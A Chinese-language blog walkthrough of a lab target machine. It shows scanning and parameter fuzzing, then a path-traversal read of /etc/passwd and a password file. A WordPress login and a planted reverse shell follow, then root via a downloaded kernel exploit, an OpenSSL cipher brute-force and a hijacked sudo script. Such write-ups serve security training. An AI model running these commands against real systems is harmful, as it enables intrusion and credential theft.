---
title: 靶机一（内核提权 + OpenSSL）
date: 2024-12-11 13:01:06
tags:
  - 靶机渗透
  - 提权
  - 内核提权
  - OpenSSL
categories:
  - 红队靶机
description: Ubuntu 16.04 靶机完整渗透记录：信息收集 → WordPress 后台 getshell → 内核提权 → OpenSSL 解密提权，两条提权路线都走了一遍。
---
### root：

#### 信息收集：

##### nmap扫描：

靶机IP：

```php
192.168.219.141
```

```php
22/tcp open  ssh
80/tcp open  http

```

细致扫描：（tcp）

```php
└─# sudo nmap -sT -sV -O -p22,80 192.168.219.141                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 10:52 CST
Nmap scan report for 192.168.219.141
Host is up (0.00051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```

（udp扫描）

```php
└─# sudo nmap -sU -p22,80 192.168.219.141       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 11:09 CST
Nmap scan report for 192.168.219.141
Host is up (0.00054s latency).

PORT   STATE  SERVICE
22/udp closed ssh
80/udp closed http

```

（漏洞脚本扫描）

```php
┌──(root㉿kali)-[/home/roots]
└─# sudo nmap --script=vuln -p22,80 192.168.219.141
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:8E:46:73 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.29 seconds
              
```



##### dir目录扫描：

```php
[11:13:04] 200 -  131B  - /dev                                              
[11:13:08] 200 -  137B  - /image.php                                        
[11:13:09] 301 -  323B  - /javascript  ->  http://192.168.219.141/javascript/
[11:13:17] 403 -  280B  - /server-status                                    
[11:13:17] 403 -  280B  - /server-status/                                   
[11:13:23] 200 -    1KB - /wordpress/wp-login.php                           
[11:13:23] 200 -    4KB - /wordpress/

```

继续扫描：

```php
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.219.141 -x.txt,.html,.php

```

我们发现比dir有更新的结果：

```php
/secret.txt           (Status: 200) [Size: 412
```

![图1](/img/target1/01.jpg)

这里含有一个提示，说明我们需要做一些fuzz的模糊测试，对我们的PHP页面；

```php
/index.php            (Status: 200) [Size: 136]
/image.php            (Status: 200) [Size: 147]

```

##### FUZZ模糊测试：

```php
┌──(root㉿kali)-[/home/roots]
└─# sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.219.141/image.php?FUZZ=tests

```

然后，我们发现含有许多的状态码是我们不需要的：

我们使用一下过滤器：

```
sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 147 http://192.168.219.141/image.php?FUZZ=tests

```

![图2](/img/target1/02.jpg)

我们发现这个是没有任何东西的，所以我们尝试使用第二个界面index.php的界面：

```
┌──(root㉿kali)-[/home/roots]
└─# sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.219.141/index.php?FUZZ=tests

```

过滤一下东西：

```
 sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.219.141/index.php?FUZZ=tests
```

![图3](/img/target1/03.jpg)

我们发现含有一个东西`file`；

结合上面的提示，我们直接提交我们的参数：

```php
http://192.168.219.141/?file=location.txt
```

![图4](/img/target1/04.jpg)

这里含有一个新的提示：

```php
http://192.168.219.141/image.php?secrettier360
```

于是我们在另一个PHP的页面中传递我们的参数：

![图5](/img/target1/05.jpg)

最后确定我们的参数是这个；

#### Web挖掘：

在确定参数后，我们直接本地目录遍历；

```php
http://192.168.219.141/image.php?secrettier360=../../../../../etc/passwd
```

![图6](/img/target1/06.jpg)

我们发现含有bash权限用户只有两个：一个是`victoe`,一个是`root`。其中还有这个一个奇怪的文件：我们读取一下；

```php
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```

```php
http://192.168.219.141/image.php?secrettier360=../../../../../../home/saket/password.txt
```

![图7](/img/target1/07.jpg)

这个应该是一个密码，正好我们前面有一个登录界面，我们可以尝试使用这个密码；

![图8](/img/target1/08.jpg)

这样我们就进入后台了；

同时，我们也可以使用wpscan这个工具进行用户爆破：

```php
┌──(root㉿kali)-[/home/roots]
└─# sudo wpscan --url http://192.168.219.141/wordpress -e u     
```

![图9](/img/target1/09.jpg)

我们在后台的这个界面部署我们的反弹shell一句话：

![图10](/img/target1/10.jpg)

```php
http://192.168.219.141/wordpress/wp-content/themes/twentynineteen/secret.php
```

这个路径是在这个，不是很好找到；

![图11](/img/target1/11.jpg)

#### 提权（内核提权）：

```php
uname -a                                                                                     
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 
```

我们去找这个的exp，

```php
searchsploit Linux ubuntu 4.10.0-28 
```

![图12](/img/target1/12.jpg)

```php
┌──(root㉿kali)-[/home/roots]
└─# searchsploit Linux ubuntu -m 45010 
```

我们把这个拿下来，然后直接对他进行gcc的环境编译：

```php
┌──(root㉿kali)-[/home/roots]
└─# sudo gcc 45010.c -o 45010 

```

##### 上传shell：

我们已经拿到这个exp了，然后我们就直接上传上去即可：

先在本地上建设一个服务器：

```pjp
┌──(root㉿kali)-[/home/roots]
└─# sudo php -S 0:88 
```

这个其实也可以起一个服务（以前做过）：

然后，直接wget我们的东西`45010.c`

```php
www-data@ubuntu:/tmp$ wget 192.168.219.128/45010.c

```

然后使用gcc来编译：

```php
www-data@ubuntu:/tmp$ gcc 45010.c -0 45010-2
gcc 45010.c -0 45010-2

```

然后就提权成功了：

```php
www-data@ubuntu:/tmp$ ./45010-2
./45010-2
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

```

#### 提权的第二种（openssl）

因为我们在最初的这个用户的时候，我们的在我们用户的目录下看到了一个enc的东西，但是如果我们执行这个enc的文件需要我们的密码，所以我们尝试去解密：

我们给予他特定的权限：

```php
www-data@ubuntu:/home/saket$ sudo ./enc
sudo ./enc

```

然后执行：

![图13](/img/target1/13.jpg)

我们发现这里多出了两个文件，这个两个文件应该就是我们的密码，所以接下来的思路就是破解这个密码：

```php
www-data@ubuntu:/home/saket$ cat enc.txt
cat enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
www-data@ubuntu:/home/saket$ cat key.txt
cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.

```

所以，我们的密钥就是`ippsec`md5之后的结果：

```php
www-data@ubuntu:/home/saket$ echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1;}'
<$ echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1;}'                      
366a74cb3c959de17d61db30591c39d1

```

上面的-n的结果是去除一个自动换行的结果（纯天然，不含有添加剂）`366a74cb3c959de17d61db30591c39d1`

但是在openssl中，这个是一个十六进制的东西，所以我们还需要使用十六进制（其中还有base64解码）：

```php
┌──(root㉿kali)-[/tmp]
└─# sudo echo -n 'ippsec' |md5sum| awk -F ' ' '{print $1}' | tr -d '\n'  |od -A n -t x1 |tr -d '\n'|tr -d ' '
3336366137346362336339353964653137643631646233303539316333396431   
```

因此，`tr -d '\n'` 的作用是删除输入中的所有换行符，使得原本多行的文本变成单行输出。

##### 遍历：

但是我们不知道是openssl中的哪一种算法，所以我们需要遍历每一种算法：

![图14](/img/target1/14.jpg)

我们创建一个文件**CipherTypeRaws**用来存放上面的算法参数：

```php
┌──(root㉿kali)-[/tmp]
└─# sudo awk '{gsub(/ /,"\n");print}' CipherTypeRaw |sort | uniq  

```

上面的这个命令就是使用awk的文本编辑器对我们换行来替代空，然后把这个结果排序----------》最后取得唯一；

![图15](/img/target1/15.jpg)

```php
for cipher in $(cat CipherTypeRaws); do echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null;echo $cipher;done
```

![图16](/img/target1/16.jpg)

遍历之后，我们获得了一个密码，所以我们直接ssh上去连接：

```php
──(root㉿kali)-[/tmp]
└─# sudo ssh saket@192.168.219.141

```

```php
saket@ubuntu:~$ sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor

```

看了一下权限，然后我们看到了我们可以使用root的权限去执行 `/home/victor/undefeated_victor`-------》我们的思路是可以使用这个目录下的root权限获得我们的bash；

```php
saket@ubuntu:/home/victor$ sudo ./undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found

```

这里含有一个提示，我们可以到上面的目录下执行我们想要的东西；

```php
saket@ubuntu:/tmp$ echo '/bin/bash' >> challenge
saket@ubuntu:/tmp$ cat challenge
#!/bin/bash

```

这样，我们就把我们的bash写入这个challenge里面了；

```phph
saket@ubuntu:/home/victor$ chmod +x /tmp/challenge

```

给予这个脚本执行的权限，然后执行----------》获得bash权限；

![图17](/img/target1/17.jpg)
